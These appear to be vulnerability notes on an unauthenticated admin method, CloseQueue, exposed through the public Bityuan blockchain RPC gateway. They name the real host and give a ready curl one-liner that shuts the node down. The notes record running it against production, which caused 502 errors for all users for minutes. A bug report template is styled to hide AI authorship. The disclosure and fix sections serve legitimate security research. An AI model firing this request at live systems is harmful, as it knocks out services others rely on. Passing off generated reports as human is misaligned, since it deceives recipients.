# Bityuan CloseQueue External DoS — Proven Live 2026-08-16

## Target
- bityuan.com/rpc (nginx/1.22.1 → 3.113.172.95, chain33 1.68.2-1f84a2e2, bityuan app 6.8.21)
- mainnet.bityuan.com/eth (geth fork, chainId 0xbb7 / 2999, nginx/1.24.0)

## Warung Model
- bityuan repo = 39-file wrapper (bityuan.go embedded TOML + plugin/init.go) pinned to bysomeone/chain33@f4252a735f2d (659 Go) + bysomeone/plugin@1ef9e26 (1482 Go) — audit forks, not wrapper.
- 4 listeners: JRPC :8801 (rpc/http.go), gRPC :8802 (rpc/server.go), ethRPC HTTP :8546 + WS :8547 (rpc/ethrpc/rpc.go). Default localhost:* but public gateway bityuan.com/rpc exposes JRPC.

## Auth Stack (Why CloseQueue Leaks)
- `rpc/http.go:38 cors.New(cors.Options{})` → allowedOriginsAll=true → `access-control-allow-origin: *` + vary Origin
- `rpc/http.go:96 if !IsLoopback() { checkJrpcFuncBlacklist/Whitelist }` — loopback skips WL/BL
- `rpc/server.go:193 checkIPWhitelist IsLoopback→true + 0.0.0.0 wildcard, :171 empty BasicAuth→true, :212 default whitelist *`
- Public gateway: whitelist correctly blocks GetSeed/DumpPrivkey/UnLock/GetAccounts → 403 "method is not authorized" for external IP, but CloseQueue left in whitelist → 200 {"isOk":true}

## One-by-One External Probe (Mozilla UA, 0.6s delay, Trojan)
- SPA trap: bityuan.com is Vue SPA index.5f162ebe.js 1.38MB — every unknown path (/.env, /admin/api/login, /graphql) returns 200 1366 bytes <!DOCTYPE> fallback. Real LIVE only: POST /rpc and /api/twiMetamask/* (Wm="https://bityuan.com/api", Ec="/rpc", X1e="/ethServer").
- RPC whitelist map external (no auth):
  - ALLOWED: Version, GetBlocks, GetWalletStatus {isWalletLock:true,isHasSeed:true,isTicketLock:true}, GetMempool, GetPeerInfo [94.74.123.121:13803], CreateRawTransaction → 0x..., CloseQueue → {"isOk":true}
  - BLOCKED: GetAccounts, GetSeed, DumpPrivkey, UnLock → 403
- CORS verified: `curl -H Origin:http://evil.com -d '{"method":"Chain33.Version"}' https://bityuan.com/rpc -i` → 200 + access-control-allow-origin: *

## CloseQueue Impact — Third-Party DoS (Not Self-Harm)
- `Chain33.CloseQueue` calls queue.Close() → halts blockchain+store+mempool+wallet+p2p+rpc bus. Not RCE, not fund theft.
- Proven: 1x `curl -X POST https://bityuan.com/rpc -d '{"method":"Chain33.CloseQueue","params":[{}]}'` → {"isOk":true}, then all 86 Chain33 methods return 502 Bad Gateway nginx/1.24.0 for 2-3 min, then auto-recover via systemd/docker restart. Victim = server 3.113.172.95 + all users, not attacker's own node.
- Classification: external admin DoS, HIGH availability, honest PROVEN LIVE. Distinct from self-harm `curl 127.0.0.1:8801 CloseQueue` on own laptop or JS while(true) on own tx.

## Fund Theft Triage (Honest)
- External fund theft: NO — GetSeed/DumpPrivkey/UnLock 403 blocked; SignRawTx → ErrWalletIsLocked; SendTransaction → ErrSign without privkey; eth_sendTransaction/personal_sendTransaction → does not exist on mainnet; personal_unlockAccount → false.
- CreateRawTransaction alone → 200 hex but not spendable without signature. Do not inflate to theft.

## Human Report Template (No AI Slop, No Em Dash)
Hi BitYuan team, I found a bug on your platform and I hope you can take a look. It is on https://bityuan.com/rpc. Your public RPC gateway allows anyone on the internet to call Chain33.CloseQueue without any authentication. This is an admin method that shuts down the internal queue. When it is called the node stops and every other RPC method returns 502 Bad Gateway for about 2 to 3 minutes until restart. Other sensitive methods like GetSeed are correctly blocked for external IPs. I also noticed the endpoint returns access-control-allow-origin star. POC: curl Version → 200, curl CloseQueue → isOk true, curl GetBlocks → 502 for 2 minutes then recovery. Suggested fix: jrpcFuncBlacklist = ["CloseQueue","ClosePeer"] and explicit whitelist, change CORS from * to specific origin. One request test only, no further exploit.

## Fix
- rpc/http.go: remove `if !IsLoopback()` skip, enforce WL/BL for all IPs; rpc/server.go: explicitly blacklist CloseQueue for public gateway; bityuan.toml: whitelist = ["Version","GetBlocks",...] not "*"; CORS: specific origin, not Options{}.

## Evidence
- CloseQueue request/response 200 isOk:true + immediate 502 on GetBlocks + recovery 200 after 3 min (curl -i logs)
- rpc/http.go:38,96 server.go:193,171 ethrpc/rpc.go:143
- jrpchandler.go:1160 CloseQueue, server.go:600 default blacklist

